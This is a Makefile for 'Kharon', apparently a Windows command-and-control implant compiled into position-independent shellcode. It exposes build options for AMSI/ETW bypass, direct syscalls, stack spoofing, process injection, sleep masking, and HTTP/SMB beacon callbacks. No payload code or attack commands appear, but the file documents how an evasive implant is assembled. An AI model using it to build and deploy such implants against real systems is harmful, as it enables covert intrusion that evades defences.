NAME   := Kharon

BUILD_PATH ?= .
OBJ_PATH   := $(BUILD_PATH)/Bin/obj
PREBUILD_MARKER := $(OBJ_PATH)/.prebuild_done

CCX64  := clang++ -target x86_64-w64-mingw32
CCX86  := clang++ -target i686-w64-mingw32
ASMCC  := nasm

CFLAGS := -Os -nostdlib -fno-asynchronous-unwind-tables -std=c++20 -fPIC -D DEBUG
CFLAGS += -fms-extensions -Wno-error=gnu-anonymous-struct -Wno-error=nested-anon-types
CFLAGS += -fno-ident -fpack-struct=8 -falign-functions=1 -w -mno-sse -s
CFLAGS += -ffunction-sections -falign-jumps=1 -falign-labels=1 -mrdrnd
CFLAGS += -Wl,-s,--no-seh,--enable-stdcall-fixup -masm=intel -fno-exceptions
CFLAGS += -fms-extensions -IInclude -Wl,-TLinker.ld -Wno-error=anonymous-struct

SRC    := $(wildcard Source/*.cc)
MISC   := $(wildcard Source/Misc/*.cc)
COMM   := $(wildcard Source/Communication/*.cc)
EVS    := $(wildcard Source/Evasion/*.cc)
INTN   := $(wildcard Source/Internals/*.cc)

# Exclude Config.cc from prebuild
SRC_NO_CONFIG    := $(filter-out Source/Config.cc, $(SRC))

# Prebuild objects (all except Config.cc)
PREBUILD_OBJ64_PATHS := $(SRC_NO_CONFIG:%.cc=$(OBJ_PATH)/%.x64.obj) \
                        $(MISC:%.cc=$(OBJ_PATH)/%.x64.obj) \
                        $(COMM:%.cc=$(OBJ_PATH)/%.x64.obj) \
                        $(EVS:%.cc=$(OBJ_PATH)/%.x64.obj) \
                        $(INTN:%.cc=$(OBJ_PATH)/%.x64.obj)

PREBUILD_OBJ86_PATHS := $(SRC_NO_CONFIG:%.cc=$(OBJ_PATH)/%.x86.obj) \
                        $(MISC:%.cc=$(OBJ_PATH)/%.x86.obj) \
                        $(COMM:%.cc=$(OBJ_PATH)/%.x86.obj) \
                        $(EVS:%.cc=$(OBJ_PATH)/%.x86.obj) \
                        $(INTN:%.cc=$(OBJ_PATH)/%.x86.obj)

# Config objects (compiled ONLY in final build, not in prebuild)
CONFIG_OBJ64 := $(OBJ_PATH)/Config.x64.obj
CONFIG_OBJ86 := $(OBJ_PATH)/Config.x86.obj

# ASM objects
ASM_OBJ64 := $(OBJ_PATH)/syscall_asm.x64.obj $(OBJ_PATH)/entry_asm.x64.obj $(OBJ_PATH)/spoof_asm.x64.obj
ASM_OBJ86 := $(OBJ_PATH)/entry.x86.obj

# All objects for final link
OBJ64_FINAL  := $(PREBUILD_OBJ64_PATHS) $(ASM_OBJ64) $(CONFIG_OBJ64)
OBJ86_FINAL  := $(PREBUILD_OBJ86_PATHS) $(ASM_OBJ86) $(CONFIG_OBJ86)

DEFS := \
 	-D KH_AGENT_UUID='"$(KH_AGENT_UUID)"' \
	-D KH_AMSI_ETW_BYPASS=${KH_AMSI_ETW_BYPASS} \
	-D KH_SYSCALL=${KH_SYSCALL} \
	-D KH_BOF_HOOK_ENABLED=${KH_BOF_HOOK_ENABLED} \
	-D KH_GUARDRAILS_USER='"${KH_GUARDRAILS_USER}"' \
	-D KH_GUARDRAILS_HOST='"${KH_GUARDRAILS_HOST}"' \
	-D KH_GUARDRAILS_IPADDRESS='"${KH_GUARDRAILS_IPADDRESS}"' \
	-D KH_GUARDRAILS_DOMAIN='"${KH_GUARDRAILS_DOMAIN}"' \
	-D KH_WORKTIME_ENABLED=${KH_WORKTIME_ENABLED} \
	-D KH_WORKTIME_START_HOUR=${KH_WORKTIME_START_HOUR} \
	-D KH_WORKTIME_START_MIN=${KH_WORKTIME_START_MIN} \
	-D KH_WORKTIME_END_HOUR=${KH_WORKTIME_END_HOUR} \
	-D KH_WORKTIME_END_MIN=${KH_WORKTIME_END_MIN} \
	-D KH_KILLDATE_ENABLED=${KH_KILLDATE_ENABLED} \
	-D KH_KILLDATE_DAY=${KH_KILLDATE_DAY} \
	-D KH_KILLDATE_MONTH=${KH_KILLDATE_MONTH} \
	-D KH_KILLDATE_YEAR=${KH_KILLDATE_YEAR} \
    -D KH_SLEEP_TIME=$(KH_SLEEP_TIME) \
	-D KH_JITTER=$(KH_JITTER) \
    -D KH_SPAWNTO_X64='"$(KH_SPAWNTO_X64)"' \
    -D KH_INJECTION_PE=$(KH_INJECTION_PE) \
    -D KH_INJECTION_SC=$(KH_INJECTION_SC) \
    -D KH_HEAP_MASK=$(KH_HEAP_MASK) \
    -D KH_SLEEP_MASK=$(KH_SLEEP_MASK) \
    -D WEB_HOST=$(WEB_HOST) \
	-D WEB_HOST_QTT=$(WEB_HOST_QTT) \
    -D WEB_PORT=$(WEB_PORT) \
	-D WEB_METHOD='L"$(WEB_METHOD)"' \
	-D WEB_PORT_QTT=$(WEB_PORT_QTT) \
	-D WEB_SECURE_ENABLED=${WEB_SECURE_ENABLED} \
    -D WEB_ENDPOINT=$(WEB_ENDPOINT) \
	-D WEB_ENDPOINT_QTT=$(WEB_ENDPOINT_QTT) \
    -D WEB_USER_AGENT='L"$(WEB_USER_AGENT)"' \
	-D WEB_HTTP_HEADERS='L"$(WEB_HTTP_HEADERS)"' \
	-D WEB_HTTP_COOKIES='L"${WEB_HTTP_COOKIES}"' \
	-D WEB_PROXY_ENABLED=${WEB_PROXY_ENABLED} \
	-D WEB_PROXY_URL='L"$(WEB_PROXY_URL)"' \
	-D WEB_PROXY_PASSWORD='L"$(WEB_PROXY_PASSWORD)"' \
	-D WEB_PROXY_USERNAME='L"$(WEB_PROXY_USERNAME)"' \
	-D SMB_PIPE_NAME=${SMB_PIPE_NAME} \

.PHONY: all release debug x64 x86 x64-debug x86-debug prebuild-x64 prebuild-x86 clean show-prebuild

all: release debug
release: x64 x86 
debug: x64-debug x86-debug

x64-release: x64 
x86-release: x86

x64-debug: CFLAGS += -D DEBUG
x64-debug: x64

x86-debug: CFLAGS += -D DEBUG
# x86-debug: x86

# ==================== PREBUILD TARGETS ====================
# Compile all objects except Config.cc and create marker file
prebuild-x64: nasm64 $(PREBUILD_OBJ64_PATHS)
	@ mkdir -p $(OBJ_PATH)
	@ touch $(PREBUILD_MARKER).x64
	@ echo "[✓] Prebuild x64 completed (Config.cc will be compiled in final build)"

prebuild-x86: nasm86 $(PREBUILD_OBJ86_PATHS)
	@ mkdir -p $(OBJ_PATH)
	@ touch $(PREBUILD_MARKER).x86
	@ echo "[✓] Prebuild x86 completed (Config.cc will be compiled in final build)"

# ==================== FINAL BUILD TARGETS ====================
x64: prebuild-x64 $(CONFIG_OBJ64)
	@ echo "[*] Linking x64..."
	@ $(CCX64) $(OBJ64_FINAL) -o $(BUILD_PATH)/Bin/$(NAME).x64.exe $(CFLAGS)
	@ objcopy --dump-section .text=$(BUILD_PATH)/Bin/$(NAME).x64.bin $(BUILD_PATH)/Bin/$(NAME).x64.exe
	@ rm $(BUILD_PATH)/Bin/$(NAME).x64.exe
	@ echo "[✓] Build x64 completed"

x86: prebuild-x86 $(CONFIG_OBJ86)
	@ echo "[*] Linking x86..."
	@ $(CCX86) $(OBJ86_FINAL) -o $(BUILD_PATH)/Bin/$(NAME).x86.exe $(CFLAGS)
	@ objcopy --dump-section .text=$(BUILD_PATH)/Bin/$(NAME).x86.bin $(BUILD_PATH)/Bin/$(NAME).x86.exe
	@ rm $(BUILD_PATH)/Bin/$(NAME).x86.exe
	@ echo "[✓] Build x86 completed"

# ==================== COMPILATION RULES ====================
# Prebuild objects (all except Config.cc)
$(OBJ_PATH)/%.x64.obj: %.cc
	@ mkdir -p $(dir $@)
	@ echo "  -> compiling $< (x64)"
	@ $(CCX64) -o $@ -c $< $(CFLAGS) $(DEFS)

$(OBJ_PATH)/%.x86.obj: %.cc
	@ mkdir -p $(dir $@)
	@ echo "  -> compiling $< (x86)"
	@ $(CCX86) -o $@ -c $< $(CFLAGS) $(DEFS)

# Config.cc - compiled ONLY in final build (not in prebuild)
$(CONFIG_OBJ64): Source/Config.cc
	@ mkdir -p $(dir $@)
	@ echo "[*] Compiling Config.cc x64..."
	@ $(CCX64) -o $@ -c $< $(CFLAGS) $(DEFS)

$(CONFIG_OBJ86): Source/Config.cc
	@ mkdir -p $(dir $@)
	@ echo "[*] Compiling Config.cc x86..."
	@ $(CCX86) -o $@ -c $< $(CFLAGS) $(DEFS)

# ==================== ASM TARGETS ====================
nasm64:
	@ mkdir -p $(OBJ_PATH)
	@ $(ASMCC) -f win64 Source/Asm/Syscall.x64.asm -o $(OBJ_PATH)/syscall_asm.x64.obj
	@ $(ASMCC) -f win64 Source/Asm/Entry.x64.asm -o $(OBJ_PATH)/entry_asm.x64.obj
	@ $(ASMCC) -f win64 Source/Asm/Spoof.x64.asm -o $(OBJ_PATH)/spoof_asm.x64.obj

nasm86:
	@ mkdir -p $(OBJ_PATH)
	@ $(ASMCC) -f win32 Source/Asm/Entry.x64.asm -o $(OBJ_PATH)/entry.x86.obj

# ==================== UTILITY TARGETS ====================
show-prebuild:
	@ echo "=== PREBUILD CONFIG ==="
	@ echo "Prebuild Objects (x64): $(words $(PREBUILD_OBJ64_PATHS)) files"
	@ echo "Prebuild Objects (x86): $(words $(PREBUILD_OBJ86_PATHS)) files"
	@ echo ""
	@ echo "EXCLUDED FROM PREBUILD:"
	@ echo "  - Source/Config.cc"
	@ echo ""
	@ echo "Compiled in FINAL BUILD"
	@ echo "========================"

clean:
	@ rm -rf $(BUILD_PATH)/Bin/obj/
	@ rm -f $(BUILD_PATH)/Bin/*.exe
	@ rm -f $(BUILD_PATH)/Bin/*.bin
	@ echo "[✓] Cleanup completed"

clean-prebuild:
	@ rm -f $(PREBUILD_MARKER).*
	@ echo "[✓] Prebuild markers removed"

clean-all: clean clean-prebuild
	@ echo "[✓] Full cleanup completed"

